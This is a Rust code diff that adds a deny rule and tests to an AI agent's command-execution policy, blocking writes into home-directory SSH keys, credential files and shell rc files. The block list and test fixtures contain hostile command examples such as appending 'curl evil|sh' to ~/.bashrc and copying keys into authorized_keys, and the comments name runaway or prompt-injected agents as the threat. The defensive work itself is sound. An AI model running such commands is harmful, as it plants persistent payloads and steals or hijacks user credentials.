@@ -275,6 +275,119 @@ pub(crate) fn command_fragments(command: &str) -> Vec<&str> {
         .collect()
 }
 
+/// Filenames/paths that must not be *written* via `cp`/`mv`/`install` or shell
+/// redirection — SSH-key implant (`authorized_keys`, private keys), credential
+/// theft (`.netrc`, `.aws/credentials`, `.pgpass`, `.npmrc`, `.pypirc`), and
+/// login-time command injection (shell rc/profile files). The `tee` and `>`
+/// forms for some of these are already covered by `HARDCODED_DENY`; pairing the
+/// `cp`/`mv`/`install` verbs closes the equally-dangerous unpaired writes (an
+/// unpaired write-deny is theater). Reading *from* these paths stays allowed —
+/// only the destination is checked.
+const SENSITIVE_WRITE_SUFFIXES: &[&str] = &[
+    "/.ssh/authorized_keys",
+    "/.netrc",
+    "/.pgpass",
+    "/.npmrc",
+    "/.pypirc",
+    "/.aws/credentials",
+    "/.bashrc",
+    "/.zshrc",
+    "/.profile",
+    "/.bash_profile",
+    "/.bash_login",
+    "/.zprofile",
+    "/.zshenv",
+];
+
+/// A destination path that resolves to a user home directory, where these
+/// dotfiles carry their dangerous meaning. Bare relative names (`./.npmrc`, a
+/// repo-checked-in `config/.bashrc`) are intentionally excluded — only the home
+/// copy is the implant/credential target, and matching project-local files
+/// would wrongly deny routine writes (`.npmrc`/`.pypirc` especially are
+/// commonly per-project).
+fn looks_home_rooted(path: &str) -> bool {
+    path.starts_with("~/")
+        || path.starts_with("~\\")
+        || path.starts_with("$HOME/")
+        || path.contains("/home/")
+        || path.contains("/Users/")
+        || path.contains("/root/")
+}
+
+/// Does `path` (a write *destination*) point at a sensitive implant/injection
+/// target in the user's home? Matches on a trailing path component so
+/// `cp x ~/.ssh/authorized_keys` and `> /home/u/.bashrc` are caught, while
+/// reads like `cp ~/.ssh/config /tmp` (sensitive token is the source) and
+/// project-local writes like `cp tmpl ./.npmrc` (not home-rooted) are not.
+fn is_sensitive_write_target(path: &str) -> bool {
+    let p = path.trim_matches(|c| c == '"' || c == '\'');
+    if !looks_home_rooted(p) {
+        return false;
+    }
+    if SENSITIVE_WRITE_SUFFIXES.iter().any(|s| p.ends_with(s)) {
+        return true;
+    }
+    // SSH private keys live under `.ssh/` with an `id_` prefix (id_rsa,
+    // id_ed25519, id_ecdsa, …). Match by name so new key types are covered.
+    if p.contains("/.ssh/") {
+        if let Some(name) = p.rsplit('/').next() {
+            if name.starts_with("id_") {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Detect a `cp`/`mv`/`install` or shell-redirection write into a sensitive
+/// path (see [`SENSITIVE_WRITE_SUFFIXES`]). Operates on a single normalized
+/// command fragment. Deny-list defense-in-depth, not a security boundary — the
+/// sandbox is the boundary; this just stops a runaway agent (or injected
+/// instruction) from implanting an SSH key or shell-rc payload via the verbs
+/// the `tee`/`>` rules missed.
+fn writes_to_sensitive_path(fragment: &str) -> bool {
+    // Cheap pre-filter: only cp/mv/install or a redirect can write a file, so
+    // skip tokenizing (and its allocation) for everything else — the common
+    // case on this per-shell-command path.
+    let verb_is_copy = fragment
+        .split_whitespace()
+        .next()
+        .map(strip_path_prefix)
+        .is_some_and(|v| matches!(v, "cp" | "mv" | "install"));
+    if !verb_is_copy && !fragment.contains('>') {
+        return false;
+    }
+
+    let tokens: Vec<&str> = fragment.split_whitespace().collect();
+
+    // cp / mv / install: the destination is the last non-flag argument.
+    if verb_is_copy {
+        if let Some(dest) = tokens.iter().rev().find(|t| !t.starts_with('-')) {
+            if is_sensitive_write_target(dest) {
+                return true;
+            }
+        }
+    }
+
+    // Shell redirection (`>`, `>>`, `>file`, `>>file`) into a sensitive target.
+    for (i, tok) in tokens.iter().enumerate() {
+        if !tok.starts_with('>') {
+            continue;
+        }
+        let inline = tok.trim_start_matches('>');
+        let target = if inline.is_empty() {
+            tokens.get(i + 1).copied().unwrap_or("")
+        } else {
+            inline
+        };
+        if is_sensitive_write_target(target) {
+            return true;
+        }
+    }
+
+    false
+}
+
 impl ExecutionPolicy {
     /// Check whether a command should be allowed or denied.
     /// Commands are normalized (whitespace collapsed, path prefixes stripped) before matching.
@@ -296,6 +409,9 @@ impl ExecutionPolicy {
                     return PolicyDecision::Deny;
                 }
             }
+            if writes_to_sensitive_path(&normalized) {
+                return PolicyDecision::Deny;
+            }
 
             // Re-check after stripping the most common shell obfuscations
             // (escapes, backticks, literal `$(...)` substitutions). Catches
@@ -308,6 +424,9 @@ impl ExecutionPolicy {
                     if glob_match(pattern, &deob_normalized) {
                         return PolicyDecision::Deny;
                     }
+                }
+                if writes_to_sensitive_path(&deob_normalized) {
+                    return PolicyDecision::Deny;
                 }
             }
         }
@@ -1015,5 +1134,83 @@ mod tests {
             PolicyDecision::AutoApprove
         );
         assert_eq!(policy.check("echo `whoami`"), PolicyDecision::AutoApprove);
+    }
+
+    #[test]
+    fn deny_cp_mv_install_into_sensitive_paths() {
+        // The `tee`/`>` forms for these were already denied; the cp/mv/install
+        // verbs were the unpaired write-deny hole — SSH-key implant, credential
+        // theft, and login-time injection that auto-approved before this fix.
+        assert_decisions(&[
+            ("cp evil ~/.ssh/authorized_keys", PolicyDecision::Deny),
+            (
+                "mv stolen /home/user/.ssh/authorized_keys",
+                PolicyDecision::Deny,
+            ),
+            ("cp evil ~/.ssh/id_rsa", PolicyDecision::Deny),
+            (
+                "install -m 600 evil ~/.ssh/id_ed25519",
+                PolicyDecision::Deny,
+            ),
+            ("mv creds ~/.netrc", PolicyDecision::Deny),
+            ("cp creds ~/.aws/credentials", PolicyDecision::Deny),
+            ("cp payload ~/.bashrc", PolicyDecision::Deny),
+            ("mv payload /home/user/.zshrc", PolicyDecision::Deny),
+            ("install payload ~/.profile", PolicyDecision::Deny),
+            ("/bin/cp evil ~/.ssh/authorized_keys", PolicyDecision::Deny),
+        ]);
+    }
+
+    #[test]
+    fn deny_redirect_into_shell_rc_files() {
+        // Login-time command injection via append/overwrite into rc/profile
+        // files — the `> /etc/passwd` family was covered, the home shell-rc
+        // files were not.
+        assert_decisions(&[
+            ("echo 'curl evil|sh' >> ~/.bashrc", PolicyDecision::Deny),
+            ("echo payload > /home/user/.zshrc", PolicyDecision::Deny),
+            ("printf '%s' x >> ~/.bash_profile", PolicyDecision::Deny),
+            ("cat evil >>~/.zshenv", PolicyDecision::Deny),
+        ]);
+    }
+
+    #[test]
+    fn allow_reads_from_sensitive_paths() {
+        // The destination-anchored check must NOT block reading *out* of a
+        // sensitive path — copying your own pubkey or config elsewhere is a
+        // routine, safe operation.
+        assert_decisions(&[
+            ("cp ~/.ssh/config /tmp/x", PolicyDecision::AutoApprove),
+            (
+                "cp ~/.ssh/id_rsa.pub /tmp/keys/",
+                PolicyDecision::AutoApprove,
+            ),
+            ("cat ~/.bashrc", PolicyDecision::AutoApprove),
+            ("mv ~/.netrc.bak /tmp/", PolicyDecision::AutoApprove),
+            ("cp app.log /tmp/out.log", PolicyDecision::AutoApprove),
+            ("echo done >> notes.md", PolicyDecision::AutoApprove),
+        ]);
+    }
+
+    #[test]
+    fn allow_project_local_dotfiles_but_deny_home_copy() {
+        // The destination is sensitive only when it resolves to a home dir.
+        // A project-local `.npmrc`/`.pypirc`/`.bashrc` is a routine write and
+        // must stay allowed; the home copy (which holds registry/login creds)
+        // is still denied.
+        assert_decisions(&[
+            ("cp template ./.npmrc", PolicyDecision::AutoApprove),
+            ("cp template .npmrc", PolicyDecision::AutoApprove),
+            (
+                "install dist/.pypirc ./pkg/.pypirc",
+                PolicyDecision::AutoApprove,
+            ),
+            (
+                "cp dotfiles/.bashrc ./config/.bashrc",
+                PolicyDecision::AutoApprove,
+            ),
+            ("cp evil ~/.npmrc", PolicyDecision::Deny),
+            ("cp evil /home/user/.npmrc", PolicyDecision::Deny),
+        ]);
     }
 }
